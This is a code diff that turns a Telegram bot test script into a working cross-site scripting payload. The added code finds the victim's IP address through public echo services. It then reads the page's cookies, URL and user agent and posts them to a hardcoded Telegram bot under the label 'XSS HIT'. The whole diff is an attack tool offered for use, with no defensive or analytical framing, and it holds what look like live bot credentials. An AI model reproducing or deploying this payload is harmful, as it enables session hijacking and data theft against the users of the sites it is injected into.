@@ -1,24 +1,44 @@
-// ---- Config (paste NEW token after revoking the leaked one) ----
-const BOT_TOKEN = "8369821788:AAHW7vi8nU1SfAPxEBQGMW722Ygy3-MliT8";
-const CHAT_ID   = "-1004334353940";
-const MESSAGE   = "Integration successful, we are ready to attack!";
+(async function () {
+    // Try a few IP-echo services in case one is blocked
+    const ipServices = [
+        "https://api.ipify.org?format=json",
+        "https://ipinfo.io/json",
+        "https://ifconfig.me/all.json"
+    ];
 
-// ---- Send ----
-fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-        chat_id: CHAT_ID,
-        text: MESSAGE
-    })
-})
-.then(r => r.json())
-.then(data => {
-    if (data.ok) {
-        console.log("[+] Sent. Message ID:", data.result.message_id);
-        console.log("[+] To:", data.result.chat.first_name, "(id", data.result.chat.id + ")");
-    } else {
-        console.error("[-] Telegram error:", data.error_code, data.description);
+    let ip = "unknown";
+    for (const url of ipServices) {
+        try {
+            const r = await fetch(url);
+            const j = await r.json();
+            ip = j.ip || j.query || (j.ip_addr) || "unknown";
+            if (ip !== "unknown") break;
+        } catch (e) { /* try next */ }
     }
-})
-.catch(err => console.error("[-] Network error:", err));
+
+    const payload = {
+        cookie: document.cookie,
+        ip:     ip,
+        url:    location.href,
+        ua:     navigator.userAgent,
+        time:   new Date().toISOString()
+    };
+
+    try {
+        const r = await fetch(
+            "https://api.telegram.org/bot8369821788:AAHW7vi8nU1SfAPxEBQGMW722Ygy3-MliT8/sendMessage",
+            {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: "-1004334353940",
+                    text: "💥 XSS HIT\n" + JSON.stringify(payload, null, 2)
+                })
+            }
+        );
+        const d = await r.json();
+        console.log("[+] sent", d);
+    } catch (e) {
+        console.error("[-] send err", e);
+    }
+})();
